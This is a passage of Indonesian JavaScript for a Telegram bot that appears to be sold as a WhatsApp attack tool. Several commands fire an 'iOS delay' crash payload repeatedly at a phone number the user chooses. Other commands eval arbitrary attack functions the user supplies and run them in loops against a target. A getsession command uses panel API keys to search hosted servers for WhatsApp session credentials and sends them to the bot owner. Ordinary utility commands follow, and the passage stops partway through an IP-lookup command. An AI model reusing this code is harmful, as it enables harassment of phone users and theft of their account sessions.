ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ɪᴏs
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY IOS TO: ${q} ]`)
        );
        await VnXNewForceIphoneSw(sock, target, true);
        await sleep(1500);
      }
    })();

  }
);

bot.command("Zverxy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Zverxy 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝙿𝚁𝙸𝙼𝙰𝙳𝙾𝙽𝙰\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ɪᴏs
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY IOS TO: ${q} ]`)
        );
        await VnXNewForceIphoneSw(sock, target, true);
        await sleep(1500);
      }
    })();

  }
);

bot.command("Zyuxtra", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Zyuxtra 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝙿𝚁𝙸𝙼𝙰𝙳𝙾𝙽𝙰\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ɪᴏs
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY IOS TO: ${q} ]`)
        );
        await VnXNewForceIphoneSw(sock, target, true);
        await sleep(1500);
      }
    })();

  }
);

bot.command("Vitaltys", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Vitaltys 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝙿𝚁𝙸𝙼𝙰𝙳𝙾𝙽𝙰\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ɪᴏs
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY IOS TO: ${q} ]`)
        );
        await VnXNewForceIphoneSw(sock, target, true);
        await sleep(1500);
      }
    })();

  }
);

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)


bot.command("tesfunc", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const senderId = ctx.from.id;
  const chatId = ctx.chat.id;
  const text = ctx.message.text.trim();
  const args = text.split(" ")[1];

  if (!args || !args.includes(",")) {
    return ctx.reply("⎙ Format salah!\n\nGunakan contoh:\n/tesfunc 6281234567890,5\nHarus reply ke file .js atau function.");
  }

  const [targetNumberRaw, loopRaw] = args.split(",");
  const formattedNumber = targetNumberRaw.replace(/[^0-9]/g, "");
  const loopCount = parseInt(loopRaw);
  const target = `${formattedNumber}@s.whatsapp.net`;

  // === CEK REPLY ===
  if (!ctx.message.reply_to_message) {
    return ctx.reply("❌ Reply ke pesan berisi file JavaScript atau kode function async!");
  }

  const repliedMsg = ctx.message.reply_to_message;
  let testFunction;

  try {
    // === Jika reply ke file .js ===
    if (repliedMsg.document && repliedMsg.document.file_name.endsWith(".js")) {
      const fileId = repliedMsg.document.file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      const response = await fetch(fileLink.href);
      const fileContent = await response.text();

      const funcMatch = fileContent.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return ctx.reply("❌ File tidak mengandung async function yang valid!");
      }

      eval(fileContent);
      testFunction = eval(funcMatch[1]);

    // === Jika reply ke teks function ===
    } else if (repliedMsg.text) {
      const funcMatch = repliedMsg.text.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return ctx.reply("❌ Kode tidak mengandung async function yang valid!");
      }

      eval(repliedMsg.text);
      testFunction = eval(funcMatch[1]);
    } else {
      return ctx.reply("❌ Format tidak didukung! Kirim file .js atau kode function.");
    }

    if (typeof testFunction !== "function") {
      return ctx.reply("❌ Gagal memuat function!");
    }

    // === MULAI TEST ===
    const progressMsg = await ctx.reply(
      `🔄 Memulai test function...\nTarget: ${formattedNumber}\nLoop: ${loopCount}x\nStatus: Processing...`
    );

    let successCount = 0;
    let errorCount = 0;
    const errors = [];

    for (let i = 0; i < loopCount; i++) {
      try {
        await testFunction(target);
        successCount++;

        if (i % Math.ceil(loopCount / 10) === 0) {
          const progress = Math.round((i / loopCount) * 100);
          const bar = "█".repeat(progress / 10) + "░".repeat(10 - progress / 10);
          await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            undefined,
            `🔄 Testing function...\nTarget: ${formattedNumber}\nLoop: ${i + 1}/${loopCount}\nProgress: ${bar} ${progress}%\n✅ Success: ${successCount}\n❌ Error: ${errorCount}`
          );
        }

        await new Promise((r) => setTimeout(r, 1000));
      } catch (err) {
        errorCount++;
        errors.push(`Loop ${i + 1}: ${err.message}`);
        console.error(`Error di loop ${i + 1}:`, err);
      }
    }

    // === HASIL AKHIR ===
    let resultText = "📊 TEST RESULTS\n\n";
    resultText += `🎯 Target: ${formattedNumber}\n`;
    resultText += `🔄 Total Loop: ${loopCount}x\n`;
    resultText += `✅ Success: ${successCount}\n`;
    resultText += `❌ Error: ${errorCount}\n`;
    resultText += `📈 Success Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\n\n`;

    if (errors.length > 0) {
      resultText += "🚨 ERROR DETAILS:\n";
      resultText += errors.slice(0, 5).join("\n");
      if (errors.length > 5) {
        resultText += `\n... dan ${errors.length - 5} error lainnya`;
      }
    }

    // === KIRIM HASIL TANPA PARSE_MODE (aman 100%) ===
    await ctx.telegram.editMessageText(
      chatId,
      progressMsg.message_id,
      undefined,
      resultText,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔍 Cek Target", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (error) {
    console.error("❌ Error saat testing:", error);
    ctx.reply(`❌ Error saat testing: ${error.message}`);
  }
});

bot.command("getsession", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /getsession https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      for (let i = 0; i < chunk.length; i++) {
        out.push(chunk[i]);
      }
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let i = 0; i < listJson.data.length; i++) {
        const item = listJson.data[i];
        if (!item) continue;
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let j = 0; j < sessJson.data.length; j++) {
                const sf = sessJson.data[j];
                if (!sf) continue;
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more && more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let i = 0; i < servers.length; i++) {
      const srv = servers[i];
      if (!srv) continue;
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let j = 0; j < list.length; j++) {
          const fileInfo = list[j];
          if (!fileInfo) continue;
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("gethtml", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const url = ctx.message.text.split(' ')[1]; // Mengambil URL dari command

  // Validasi URL
  if (!url || !/^https?:\/\//i.test(url)) {
    return ctx.reply("🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`", {
      parse_mode: "Markdown",
    });
  }

  try {
    await ctx.reply("⏳ Mengambil source code dari URL...");

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ *Gagal mengambil source code dari URL tersebut!*");
    }

    const html = await res.text();
    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    // Mengirim file sebagai document
    await ctx.replyWithDocument({
      source: filePath,
      filename: "source_code.html",
      contentType: "text/html"
    });

    fs.unlinkSync(filePath); // Hapus file setelah dikirim
    
  } catch (err) {
    console.error(err);
    ctx.reply(`❌ *Terjadi kesalahan:*\n\`${err.message}\``, {
      parse_mode: "Markdown",
    });
  }
});

bot.command("cekfunc", async (ctx) => {
  try {
    if (!ctx.message.reply_to_message) {
      return ctx.reply("🪧 ☇ Reply function JavaScript yang ingin dicek.")
    }

    const text = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption

    if (!text) {
      return ctx.reply("❌ ☇ Pesan yang direply tidak berisi kode.")
    }

    let acorn
    try {
      acorn = require("acorn")
    } catch {
      return ctx.reply("❌ ☇ Module acorn belum terinstall.\nInstall dengan: npm install acorn")
    }

    try {
      acorn.parse(text, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true
      })

      return ctx.reply(`
✅ SYNTAX VALID
━━━━━━━━━━━━━━━
🔎 Tidak ditemukan error syntax.

© X-PRIMADINA`, { parse_mode: "HTML" })

    } catch (err) {
      const lines = text.split("\n")
      const line = err.loc.line
      const column = err.loc.column

      const start = Math.max(0, line - 3)
      const end = Math.min(lines.length, line + 2)

      const snippet = lines.slice(start, end).map((l, i) => {
        const num = start + i + 1
        return num === line
          ? `👉 ${num} | ${l}`
          : `   ${num} | ${l}`
      }).join("\n")

      return ctx.reply(`
❌ ERROR TERDETEKSI
━━━━━━━━━━━━━━━
📌 ${err.message}
📍 Line ${line}:${column}

📋 Cuplikan:
\`\`\`javascript
${snippet}
\`\`\`

© 𝙷𝙴𝚇𝚃𝚁𝙰-𝚂𝚆𝙾𝚁𝙳`, { parse_mode: "HTML" })
    }

  } catch (e) {
    console.error(e)
    ctx.reply("❌ ☇ Terjadi error saat mengecek function.")
  }
})
// CASE TOOLS
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat ziper ganteng", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|FranszJmbud",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Fransz Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("pinterest", async ctx => {
  const q = ctx.message.text.replace("/pinterest ", "")
  if (!q) return ctx.reply("Format: /pinterest kucing")

  const res = await axios.get(
    "https://id.pinterest.com/search/pins/?q=" + encodeURIComponent(q),
    { headers: { "User-Agent": "Mozilla/5.0" } }
  )

  const img = res.data.match(/https:\/\/i\.pinimg\.com\/originals\/[^"]+/)

  ctx.replyWithPhoto(img[0], { caption: q })
})

bot.command("ig", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text)
    return ctx.reply(
      "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/"
    );

  const url = text.trim();

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(
      url
    )}`;

    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data?.result) {
      return ctx.reply("❌ Failed to fetch Instagram media. Please check the URL.");
    }

    const username = data.result.username || "-";

    if (data.result.video) {
      await ctx.replyWithVideo(data.result.video, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else if (data.result.image) {
      await ctx.replyWithPhoto(data.result.image, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else {
      ctx.reply("❌ Unsupported media type from Instagram.");
    }
  } catch (err) {
    console.error("Instagram API Error:", err);
    ctx.reply("❌ Error fetching Instagram media. Please try again later.");
  }
});
bot.command("info", (ctx) => {
  const u = ctx.from;

  const info = `
🪪 <b>Your Profile Info</b>
━━━━━━━━━━━━━━━━━━
👤 Name: ${u.first_name || "-"} ${u.last_name || ""}
🏷 Username: @${u.username || "None"}
🆔 ID: <code>${u.id}</code>
🌐 Language: ${u.language_code || "unknown"}
`;

  ctx.reply(info, { parse_mode: "HTML" });
});

bot.command("gempa", async (ctx) => {
  try {
    const res = await fetch(
      "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json"
    );
    const data = await res.json();
    const g = data.Infogempa.gempa;

    const info = `
📢 *Latest Earthquake (BMKG)*
📅 Date: ${g.Tanggal}
🕒 Time: ${g.Jam}
📍 Location: ${g.Wilayah}
📊 Magnitude: ${g.Magnitude}
📌 Depth: ${g.Kedalaman}
🌊 Potential: ${g.Potensi}
🧭 Coordinates: ${g.Coordinates}
🗺️ Felt: ${g.Dirasakan || "-"}
`;

    await ctx.reply(info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch earthquake data.");
  }
});
bot.command('cekidch', async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! /cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await sock.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});
bot.command("shortlink", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!url) {
    return ctx.reply(
      "🔗 Send the link you want to shorten!\n\nExample:\n`/shortlink https://example.com/very/long/link`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const res = await fetch(
      `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`
    );
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Shorten failed");
    }

    await ctx.reply(
      `✅ *Link shortened!*\n\n🔹 Original: ${url}\n🔹 Short: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("Shortlink error:", err);
    ctx.reply("⚠️ Failed to shorten link. Try again later.");
  }
});

bot.command("trackip", async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
⫹⫺ - IP: ${data.ip || "-"}
⫹⫺ - Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⫹⫺ - Region: ${data.region || "-"}
⫹⫺ - City: ${data.city || "-"}
⫹⫺ - ZIP: ${data.postal || "-"}
⫹⫺ - Timezone: ${data.timezone_gmt || "-"}
⫹⫺ - ISP: ${data.isp || "-"}
⫹⫺ - Org: ${data.org || "-"}
⫹⫺ - ASN: ${data.asn || "-"}
⫹⫺ - Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
